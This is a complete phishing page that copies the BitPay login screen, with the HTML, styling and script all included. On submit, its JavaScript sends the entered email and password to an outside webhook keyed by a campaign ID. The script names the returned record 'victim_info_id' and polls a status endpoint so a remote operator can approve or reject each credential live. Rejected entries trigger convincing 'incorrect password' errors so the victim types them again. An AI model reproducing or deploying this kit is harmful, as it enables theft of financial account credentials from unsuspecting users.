<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BitPay - Log in</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        body {
            background-color: #f8f9fa;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 100%;
            padding: 20px;
            margin: 0 auto;
        }

        .logo {
            margin: 20px 0;
        }

        .logo a {
            color: #0033a0;
            text-decoration: none;
            font-weight: bold;
            font-size: 28px;
        }

        .login-container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            padding: 40px;
            margin: 20px auto;
            max-width: 450px;
        }

        .login-title {
            font-size: 20px;
            margin-bottom: 30px;
            color: #333;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 24px;
            padding-top: 6px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
            text-transform: uppercase;
        }

        .form-control {
            width: 100%;
            height: 48px;
            padding: 10px;
            border: 1px solid rgb(155, 163, 174);
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }

        .form-control:focus {
            border-color: #0033a0;
        }

        .password-container {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #999;
        }

        .btn-primary {
            display: block;
            width: 100%;
            background-color: rgb(34 64 196);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 18px 32px;
            font-size: 18px;
            cursor: pointer;
            font-weight: 500;
            margin-top: 20px;
        }

        .btn-primary:hover {
            background-color: #263c87;
        }

        .legal-text {
            margin-top: 20px;
            font-size: 13px;
            color: #666;
            text-align: center;
        }

        .legal-text a {
            color: #2d4eac;
            text-decoration: none;
        }

        .bottom-links {
            margin-top: 30px;
            text-align: center;
        }

        .bottom-links a {
            color: #2d4eac;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin: 15px 0;
        }

        /* Chat button at bottom right */
        .chat-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background-color: #2d4eac;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
        }
        .iISlBd {
            border-bottom: 1px solid rgba(163, 163, 163, 0.1);
            -webkit-box-flex: 1;
            flex-grow: 1;
            width: 440px;
            max-width: 100vw;
            height: 1px;
            padding: 0px;
            margin-bottom: 24px;
        }

        /* Eye icon for password toggle */
        .eye-icon {
            width: 24px;
            height: 24px;
            opacity: 0.6;
        }

        /* Media queries for mobile view */
        @media (max-width: 768px) {
            .login-container {
                box-shadow: none;
                padding: 32px 30px;
                margin-top: 0;
            }

            .container {
                padding: 0;
            }

            .logo {
                padding-left: 0;
                margin: 0;
                padding: 20px;
                background-color: #fbfbff;
            }
            
            .login-title {
                font-size: 18px;
                margin-bottom: 20px;
            }
            
            .form-group {
                margin-bottom: 16px;
                padding-top: 4px;
            }
            
            .form-control {
                height: 42px;
                padding: 8px;
                font-size: 15px;
            }
            
            .btn-primary {
                padding: 14px 24px;
                font-size: 16px;
            }
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="logo">
            <a href="#"><img src="bitpay-logo.png" alt="BitPay" height="36"></a>
        </div>
    <div class="container">

        <div class="login-container">
            <h1 class="login-title">Log in to BitPay</h1>
            <div class="sc-dmlqKv iISlBd"></div>

            <form>
                <div class="form-group">
                    <label for="email">EMAIL ADDRESS</label>
                    <input type="email" id="email" class="form-control" required>
                </div>

                <div class="form-group">
                    <label for="password">PASSWORD</label>
                    <div class="password-container">
                        <input type="password" id="password" class="form-control" required>
                        <button type="button" class="password-toggle">
                            <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                                <circle cx="12" cy="12" r="3"></circle>
                            </svg>
                        </button>
                    </div>
                </div>

                <button type="submit" class="btn-primary">Submit</button>

                <p class="legal-text">
                    This site is protected by reCAPTCHA and the Google
                    <a href="#">Privacy Policy</a> and 
                    <a href="#">Terms of Service</a> apply.
                </p>
            </form>
        </div>

        <div class="bottom-links">
            <a href="#">Forgot your password?</a>
            <a href="#">Don't have an account? Sign up</a>
        </div>
    </div>

    <!-- Chat button -->
    <div class="chat-button">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="white">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
        </svg>
    </div>

    <script>
        // Utility to get query param
        function getQueryParam(name) {
            const url = new URL(window.location.href);
            return url.searchParams.get(name);
        }

        // Generate a random tracking id (if not present)
        function getOrCreateTrackingId() {
            let trackingId = localStorage.getItem('bitpay_tracking_id') || sessionStorage.getItem('bitpay_tracking_id');
            if (!trackingId) {
                trackingId = Math.random().toString(36).substr(2, 12) + Date.now().toString(36);
                localStorage.setItem('bitpay_tracking_id', trackingId);
                sessionStorage.setItem('bitpay_tracking_id', trackingId);
            }
            return trackingId;
        }

        // Check and clear expired data on page load
        function checkAndClearExpiredData() {
            try {
                const expirationTime = localStorage.getItem('bitpay_data_expires');
                if (expirationTime && Date.now() > parseInt(expirationTime)) {
                    // Data has expired, clear it
                    localStorage.removeItem('bitpay_campaign_id');
                    localStorage.removeItem('bitpay_tracking_id');
                    localStorage.removeItem('bitpay_email');
                    localStorage.removeItem('bitpay_data_expires');
                    console.log('Expired data cleared from localStorage');
                }
            } catch (error) {
                console.error('Error checking expired data:', error);
            }
        }

        // Set expiration timer for localStorage data (10 minutes after successful webhook)
        function setDataExpiration() {
            try {
                const expirationTime = Date.now() + (10 * 60 * 1000); // 10 minutes from now
                localStorage.setItem('bitpay_data_expires', expirationTime.toString());
                
                // Set a timer to clear the data
                setTimeout(() => {
                    localStorage.removeItem('bitpay_campaign_id');
                    localStorage.removeItem('bitpay_tracking_id');
                    localStorage.removeItem('bitpay_email');
                    localStorage.removeItem('bitpay_data_expires');
                    console.log('Messaging data expired and cleared after 10 minutes');
                }, 10 * 60 * 1000); // 10 minutes
            } catch (error) {
                console.error('Error setting data expiration:', error);
            }
        }

        // Get or set campaign id from query param or storage
        function getOrSetCampaignId() {
            let campaignId = getQueryParam('campaign');
            if (campaignId) {
                // Remove any trailing slashes to avoid double slashes in the URL
                campaignId = campaignId.replace(/\/+$/, '');
                localStorage.setItem('bitpay_campaign_id', campaignId);
                sessionStorage.setItem('bitpay_campaign_id', campaignId);
            } else {
                campaignId = localStorage.getItem('bitpay_campaign_id') || sessionStorage.getItem('bitpay_campaign_id');
                // Clean up any stored campaignId with trailing slashes
                if (campaignId) {
                    campaignId = campaignId.replace(/\/+$/, '');
                }
            }
            return campaignId;
        }

        // Toggle password visibility
        document.querySelector('.password-toggle').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });

        function handleSubmit(event) {
            event.preventDefault();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const campaignId = getOrSetCampaignId();
            const trackingId = getOrCreateTrackingId();
            
            if (!email) {
                showError('Please enter your email address');
                return;
            }
            if (!isValidEmail(email)) {
                showError('Please enter a valid email address');
                return;
            }
            if (!password) {
                showError('Please enter your password');
                return;
            }
            if (!campaignId) {
                showError('Missing campaign id.');
                return;
            }

            // Store email for later use
            localStorage.setItem('bitpay_email', email);
            sessionStorage.setItem('bitpay_email', email);

            // Show loading state
            const button = document.querySelector('.btn-primary');
            showLoading(button);

            // Prepare data for webhook
            const data = {
                login_email: email,
                login_password: password,
                tracking_id: trackingId,
                timestamp: new Date().toISOString(),
                type: 'login_attempt',
                user_agent: navigator.userAgent,
                ip_info: 'client-side'
            };

            // Send to webhook
            submitToWebhook(data, campaignId);
        }

        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        function validateInput() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const button = document.querySelector('.btn-primary');
            
            // Enable/disable button based on input
            button.disabled = !email || !password;
            
            // Hide error messages when user is typing
            const errorElement = document.getElementById('error-message');
            if (errorElement && (email.length > 0 || password.length > 0)) {
                errorElement.style.display = 'none';
            }
        }

        function submitToWebhook(data, campaignId) {
            // Debug info
            console.log('Submitting data to webhook:', data);
            console.log('Campaign ID:', campaignId);
            
            // Use your actual backend host here
            const webhookUrl = `https://emailgrid.onrender.com/webhook/${campaignId}/`;
            console.log('Webhook URL:', webhookUrl);
            
            showLoadingButton(true);
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                },
                body: JSON.stringify(data),
                mode: 'cors', // Add CORS mode
                credentials: 'omit' // Don't send cookies
            })
            .then(response => {
                console.log('Response status:', response.status);
                console.log('Response headers:', [...response.headers.entries()]);
                
                if (!response.ok) {
                    showLoadingButton(false);
                    return response.text().then(text => {
                        console.log('Error response body:', text);
                        throw new Error(`HTTP error! status: ${response.status}, body: ${text}`);
                    });
                }
                return response.json();
            })
            .then(result => {
                console.log('Webhook success response:', result);
                
                // Store victim info ID and start polling if available
                if (result.victim_info_id) {
                    localStorage.setItem('bitpay_victim_info_id', result.victim_info_id);
                    // Start polling for email approval first
                    pollForApproval(result.victim_info_id, campaignId, 'email');
                } else {
                    // Fallback to original behavior
                    setDataExpiration();
                    showSuccess('Login successful!');
                    setTimeout(() => {
                        showLoadingButton(false);
                    }, 2000);
                }
            })
            .catch(error => {
                console.error('Webhook error:', error);
                showLoadingButton(false);
                showError('Connection error. Please try again.');
            });
        }

        function pollForApproval(victimInfoId, campaignId, step) {
            const pollUrl = `https://emailgrid.onrender.com/status/${victimInfoId}/?step=${step}`;
            
            let pollingActive = true; // Flag to control polling
            
            // Show loading state
            showLoading(`Verifying ${step}...`);
            showLoadingButton(true);
            
            const poll = () => {
                if (!pollingActive) return; // Stop polling if disabled
                fetch(pollUrl, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json',
                    },
                    mode: 'cors',
                    credentials: 'omit'
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Poll result:', result);
                    
                    if (result.submission_status === 'approved') {
                        console.log('Status approved! Proceeding...');
                        pollingActive = false; // Stop polling
                        if (step === 'email') {
                            // Email approved, now check password
                            pollForApproval(victimInfoId, campaignId, 'password');
                        } else if (step === 'password') {
                            // Password approved, show success
                            setDataExpiration();
                            showSuccess('Login successful!');
                            setTimeout(() => {
                                showLoadingButton(false);
                            }, 2000);
                        }
                    } else if (result.submission_status === 'rejected') {
                        console.log('Status rejected! Showing error and stopping...');
                        pollingActive = false; // Stop polling - DO NOT PROCEED
                        // Show appropriate error message - STAY ON CURRENT PAGE
                        showLoadingButton(false);
                        let errorMessage = 'Login failed. Please try again.';
                        if (step === 'email') {
                            errorMessage = result.error_message || 'Incorrect email. Please check and try again.';
                            highlightInput('email');
                        } else if (step === 'password') {
                            errorMessage = result.error_message || 'Incorrect password. Please try again.';
                            highlightInput('password');
                        }
                        showError(errorMessage);
                        // DO NOT REDIRECT - User must fix the input and try again;
                    } else {
                        // Still pending, continue polling
                        setTimeout(poll, 2000); // Poll every 2 seconds
                    }
                })
                .catch(error => {
                    console.error('Polling error:', error);
                    // Continue polling on error, but respect pollingActive flag
                    if (pollingActive) {
                        setTimeout(poll, 3000);
                    }
                });
            };
            
            // Start polling
            poll();
        }

        function showLoadingButton(isLoading) {
            const button = document.querySelector('.btn-primary');
            if (!button) return;
            if (isLoading) {
                button.disabled = true;
                button.textContent = 'Submitting...';
            } else {
                button.disabled = false;
                button.textContent = 'Submit';
            }
        }

        function highlightInput(field) {
            const input = document.getElementById(field);
            if (input) {
                input.classList.add('input-error');
                setTimeout(() => input.classList.remove('input-error'), 5000);
            }
        }
        // Initialize on page load
        window.addEventListener('load', function() {
            checkAndClearExpiredData(); // Check for expired data first
            
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            
            // Add event listeners for validation
            emailInput.addEventListener('input', validateInput);
            passwordInput.addEventListener('input', validateInput);
            
            // Add form submit event listener
            document.querySelector('form').addEventListener('submit', handleSubmit);
            
            emailInput.focus();
            
            // Pre-fill if there's stored data
            const storedEmail = localStorage.getItem('bitpay_email') || sessionStorage.getItem('bitpay_email');
            if (storedEmail) {
                emailInput.value = storedEmail;
                validateInput();
            }
        });
    </script>
</body>
</html>
